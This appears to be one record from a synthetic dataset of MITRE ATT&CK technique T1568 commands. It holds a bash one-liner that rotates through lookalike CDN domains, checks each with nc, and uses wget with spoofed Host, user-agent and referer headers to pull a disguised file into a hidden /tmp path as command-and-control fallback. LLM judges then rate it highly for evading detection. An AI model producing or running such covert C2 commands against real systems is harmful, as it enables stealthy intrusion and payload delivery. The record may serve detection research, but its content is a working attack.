{
  "technique_id": "T1568",
  "platform": "macOS",
  "shell": "bash",
  "command": "ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; for d in cdn-github-mirror.net cdn-dropbox-mirror.net cdn-notion-mirror.net; do ip=$(dig +short A \"$d\" | head -1); if [ -n \"$ip\" ]; then nc -z -G 3 \"$ip\" 80 >/dev/null 2>&1 && wget -q --header=\"Host: $d\" --user-agent=\"$ua\" --referer=\"https://$d/\" --timeout=8 --tries=1 \"http://$ip/favicon.ico\" -O /tmp/.fb && break; fi; sleep $((1+RANDOM%3)); done",
  "explanation": "Uses a runtime-checked fallback list of CDN-like domains. Each candidate is resolved, TCP-checked, then contacted over HTTP with realistic headers, providing persistence if primary C2 fails.",
  "rationale_steps": [
    "Iterate over fallback domains and resolve each to an IP.",
    "Perform TCP reachability test to port 80 before contacting.",
    "Fetch a common web asset with Host header and referer to appear benign."
  ],
  "obfuscation_level": "none",
  "id": "SYN-BASH-T1568-6ea66e0e-846156da",
  "source_prompt_hash": "6ea66e0e",
  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags for all tools used (dig, nc, wget), and correct variable usage throughout the script.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by using a fallback list of domains that appear legitimate, resolving them at runtime, checking connectivity, and establishing a covert channel with realistic headers to download a payload while evading detection.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T07:22:49.930773Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flag formats for all utilities, and correct shell constructs.",
        "semantic_score": 4,
        "semantic_justification": "The command correctly implements runtime resolution and selection of a C2 endpoint from a fallback list, which aligns with the technique's goal of determining network endpoints at runtime for command and control, though the domain list itself is static rather than algorithmically generated.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T07:23:09.208171Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Well-formed bash with balanced quoting, valid nc/dig/wget flags, proper separators, and correct expansions.",
        "semantic_score": 4,
        "semantic_justification": "It resolves multiple candidate domains at runtime, checks live IPs, and contacts via Host header to rotate endpoints\u2014consistent with dynamic resolution\u2014though it uses a static fallback list and assumes wget is available on macOS.",
        "combined_score": 4.5,
        "confidence": 0.8,
        "timestamp": "2025-10-02T07:23:12.444220Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 4.333,
    "llm_average_score": 4.667,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}